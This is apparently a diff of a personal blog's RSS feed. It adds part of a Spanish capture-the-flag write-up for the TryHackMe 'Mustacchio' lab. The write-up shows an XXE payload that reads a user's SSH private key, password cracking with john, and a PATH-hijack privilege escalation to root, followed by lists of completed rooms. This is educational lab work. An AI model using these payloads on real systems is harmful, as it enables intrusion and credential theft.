+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;&lt;span class=&#34;ni&#34;&gt;&amp;amp;testxxe;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;author&amp;gt;&lt;/span&gt;test2&lt;span class=&#34;nt&#34;&gt;&amp;lt;/author&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;com&amp;gt;&lt;/span&gt;test3&lt;span class=&#34;nt&#34;&gt;&amp;lt;/com&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/comment&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/images/6.png&#34;
+	width=&#34;1870&#34;
+	height=&#34;407&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;459&#34;
+		data-flex-basis=&#34;1102px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;¡Funciona!&lt;/p&gt;
+&lt;p&gt;Usando lo mismo podemos ver la &amp;ldquo;RSA PRIVATE KEY&amp;rdquo;.
+Esta vez en vez del &amp;ldquo;file://&amp;rdquo; he usado &amp;ldquo;php://filter/convert.base64-encode/resource=/&amp;rdquo; para que no pierda la estructura.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY testxxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/home/barry/.ssh/id_rsa&amp;#34;&amp;gt;&lt;/span&gt; ]&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;comment&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;&lt;span class=&#34;ni&#34;&gt;&amp;amp;testxxe;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;author&amp;gt;&lt;/span&gt;test2&lt;span class=&#34;nt&#34;&gt;&amp;lt;/author&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;com&amp;gt;&lt;/span&gt;test3&lt;span class=&#34;nt&#34;&gt;&amp;lt;/com&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/comment&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;La respuesta está encriptada con base64. La podemos desencriptar de la siguiente forma&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Respuesta en base64&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;La respuesta la guardamos en un archivo llamado id_rsa y le hacemos un &lt;code&gt;chmod 400 id_rsa&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;La &amp;ldquo;RSA PRIVATE KEY&amp;rdquo; está encriptada, la podemos desencriptar con john:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh2john id_rsa &amp;gt; hash.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;john hash.txt --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ya tenemos unas credenciales para conectarnos por ssh&lt;/p&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;Dentro de /home/joe hay un archivo interesante&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;barry@mustacchio:/home/joe# file live_log
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;live_log: setuid ELF 64-bit LSB shared object, x86-64, version &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SYSV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;]=&lt;/span&gt;6c03a68094c63347aeb02281a45518964ad12abe, &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, not stripped
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Con el comando strings podemos ver cadenas de texto, En una línea se ve como ejecuta tail sin poner la ruta completa, nos podemos aprovechar de esto creando un tail en /tmp y añadiendo el /tmp en el path, de esta forma podremos ejecutar lo que queramos como root.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt; &amp;gt; /tmp/tail
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod +x /tmp/tail
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/tmp:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;¡Ya somos root!&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Resolución Wonderland</title>
         <link>https://d3b0o.github.io/p/resoluci%C3%B3n-wonderland/</link>
         <pubDate>Wed, 11 Jan 2023 00:00:00 +0000</pubDate>
@@ -8707,6 +9082,41 @@ surfh4cker&lt;/a&gt; el siguiente script, que básicamente lo que hace es animar
         <description></description>
         </item>
         <item>
+        <title>Rooms Complete</title>
+        <link>https://d3b0o.github.io/whoami/thm/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/whoami/thm/</guid>
+        <description>&lt;ul&gt;
+&lt;li&gt;Gotta Catch&amp;rsquo;em All!: Jan 14, 2023&lt;/li&gt;
+&lt;li&gt;Lian_Yu: Jan 13, 2023&lt;/li&gt;
+&lt;li&gt;Year of the Rabbit: Jan 12, 2023&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-wonderland/&#34; &gt;&lt;strong&gt;Wonderland&lt;/strong&gt;&lt;/a&gt;: Jan 11, 2023&lt;/li&gt;
+&lt;li&gt;c4ptur3-th3-fl4g: Jan 11, 2023&lt;/li&gt;
+&lt;li&gt;Neighbour: Jan 10, 2023&lt;/li&gt;
+&lt;li&gt;Ignite: Jan 10, 2023&lt;/li&gt;
+&lt;li&gt;Crack the hash: Jan 9, 2023&lt;/li&gt;
+&lt;li&gt;Brute it: Jan 8, 2023&lt;/li&gt;
+&lt;li&gt;Simple CTF: Jan 7, 2023&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-bounty-hacker/&#34; &gt;&lt;strong&gt;Bounty Hacker&lt;/strong&gt;&lt;/a&gt;: Jan 1, 2023&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-overpass/&#34; &gt;&lt;strong&gt;Overpass&lt;/strong&gt;&lt;/a&gt;: Jan 1, 2023&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-develpy/&#34; &gt;&lt;strong&gt;Develpy&lt;/strong&gt;&lt;/a&gt;: Dec 31, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-tomghost/&#34; &gt;&lt;strong&gt;Tomghost&lt;/strong&gt;&lt;/a&gt;: Dec 30, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-wgel/&#34; &gt;&lt;strong&gt;Wgel&lt;/strong&gt;&lt;/a&gt;: Dec 28, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-gallery/&#34; &gt;&lt;strong&gt;Gallery&lt;/strong&gt;&lt;/a&gt;: Dec 21, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-ctf-mr.robot/&#34; &gt;&lt;strong&gt;Mr.Robot&lt;/strong&gt;&lt;/a&gt;: Dec 20, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-agent-t/&#34; &gt;&lt;strong&gt;Agent T&lt;/strong&gt;&lt;/a&gt;: Dec 19, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-walkthrough-vulnversity/&#34; &gt;&lt;strong&gt;Vulnversity&lt;/strong&gt;&lt;/a&gt;: Dec 18, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-brooklyn-nine-nine/&#34; &gt;&lt;strong&gt;Brooklyn Nine Nine&lt;/strong&gt;&lt;/a&gt;: Dec 17, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-agent-sudo/&#34; &gt;&lt;strong&gt;Agent sudo&lt;/strong&gt;&lt;/a&gt;: Dec 15, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-lazy-admin/&#34; &gt;&lt;strong&gt;Lazy admin&lt;/strong&gt;&lt;/a&gt;: Dec 14, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-chocolate-factory/&#34; &gt;&lt;strong&gt;Chocolate Factory&lt;/strong&gt;&lt;/a&gt;: Dec 13, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-ctf-rootme/&#34; &gt;&lt;strong&gt;RootMe&lt;/strong&gt;&lt;/a&gt;: Dec 11, 2022&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-pickle-rick/&#34; &gt;&lt;strong&gt;Pickle Rick&lt;/strong&gt;&lt;/a&gt;: Dec 10, 2022&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
         <title>Search</title>
         <link>https://d3b0o.github.io/search/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -8802,47 +9212,9 @@ surfh4cker&lt;/a&gt; el siguiente script, que básicamente lo que hace es animar
 &lt;h2 id=&#34;tryhackme-thm&#34;&gt;TryHackMe (THM)&lt;/h2&gt;
 &lt;p&gt;Perfil: &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/p/d3b0o&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://tryhackme.com/p/d3b0o&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;ctf-completados&#34;&gt;CTF Completados&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-wonderland/&#34; &gt;&lt;strong&gt;Wonderland&lt;/strong&gt;&lt;/a&gt;: Jan 11, 2023&lt;/li&gt;
-&lt;li&gt;c4ptur3-th3-fl4g: Jan 11, 2023&lt;/li&gt;
-&lt;li&gt;Neighbour: Jan 10, 2023&lt;/li&gt;
-&lt;li&gt;Ignite: Jan 10, 2023&lt;/li&gt;
-&lt;li&gt;Crack the hash: Jan 9, 2023&lt;/li&gt;
-&lt;li&gt;Brute it: Jan 8, 2023&lt;/li&gt;
-&lt;li&gt;Simple CTF: Jan 7, 2023&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-bounty-hacker/&#34; &gt;&lt;strong&gt;Bounty Hacker&lt;/strong&gt;&lt;/a&gt;: Jan 1, 2023&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-overpass/&#34; &gt;&lt;strong&gt;Overpass&lt;/strong&gt;&lt;/a&gt;: Jan 1, 2023&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-develpy/&#34; &gt;&lt;strong&gt;Develpy&lt;/strong&gt;&lt;/a&gt;: Dec 31, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-tomghost/&#34; &gt;&lt;strong&gt;Tomghost&lt;/strong&gt;&lt;/a&gt;: Dec 30, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-wgel/&#34; &gt;&lt;strong&gt;Wgel&lt;/strong&gt;&lt;/a&gt;: Dec 28, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-gallery/&#34; &gt;&lt;strong&gt;Gallery&lt;/strong&gt;&lt;/a&gt;: Dec 21, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-ctf-mr.robot/&#34; &gt;&lt;strong&gt;Mr.Robot&lt;/strong&gt;&lt;/a&gt;: Dec 20, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-agent-t/&#34; &gt;&lt;strong&gt;Agent T&lt;/strong&gt;&lt;/a&gt;: Dec 19, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-walkthrough-vulnversity/&#34; &gt;&lt;strong&gt;Vulnversity&lt;/strong&gt;&lt;/a&gt;: Dec 18, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-brooklyn-nine-nine/&#34; &gt;&lt;strong&gt;Brooklyn Nine Nine&lt;/strong&gt;&lt;/a&gt;: Dec 17, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-agent-sudo/&#34; &gt;&lt;strong&gt;Agent sudo&lt;/strong&gt;&lt;/a&gt;: Dec 15, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-lazy-admin/&#34; &gt;&lt;strong&gt;Lazy admin&lt;/strong&gt;&lt;/a&gt;: Dec 14, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-chocolate-factory/&#34; &gt;&lt;strong&gt;Chocolate Factory&lt;/strong&gt;&lt;/a&gt;: Dec 13, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-ctf-rootme/&#34; &gt;&lt;strong&gt;RootMe&lt;/strong&gt;&lt;/a&gt;: Dec 11, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-pickle-rick/&#34; &gt;&lt;strong&gt;Pickle Rick&lt;/strong&gt;&lt;/a&gt;: Dec 10, 2022&lt;/li&gt;
-&lt;/ul&gt;
 &lt;h2 id=&#34;hacthebox-htb&#34;&gt;HacTheBox (HTB)&lt;/h2&gt;
 &lt;p&gt;Perfil: &lt;a class=&#34;link&#34; href=&#34;https://app.hackthebox.com/profile/822100&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://app.hackthebox.com/profile/822100&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;ctf-completados-1&#34;&gt;CTF Completados&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-m%c3%a1quina-optimum/&#34; &gt;&lt;strong&gt;Optimum&lt;/strong&gt;&lt;/a&gt;: Dec 09, 2022&lt;/li&gt;
-&lt;li&gt;Shoppy: Nov 16, 2022&lt;/li&gt;
-&lt;li&gt;Photobomb: Nov 15, 2022&lt;/li&gt;
-&lt;li&gt;Knife: Feb 10, 2022&lt;/li&gt;
-&lt;li&gt;Cap: Feb 10, 2022&lt;/li&gt;
-&lt;li&gt;Nibbles: Feb 09, 2022&lt;/li&gt;
-&lt;li&gt;Jerry: Feb 09, 2022&lt;/li&gt;
-&lt;li&gt;Bashed: Feb 08, 2022&lt;/li&gt;
-&lt;li&gt;Lame: Feb 08, 2022&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://d3b0o.github.io/p/resoluci%c3%b3n-m%c3%a1quina-horizontall/&#34; &gt;&lt;strong&gt;Horizontall&lt;/strong&gt;&lt;/a&gt;: Feb 06, 2022&lt;/li&gt;
-&lt;/ul&gt;
 </description>
         </item>
         
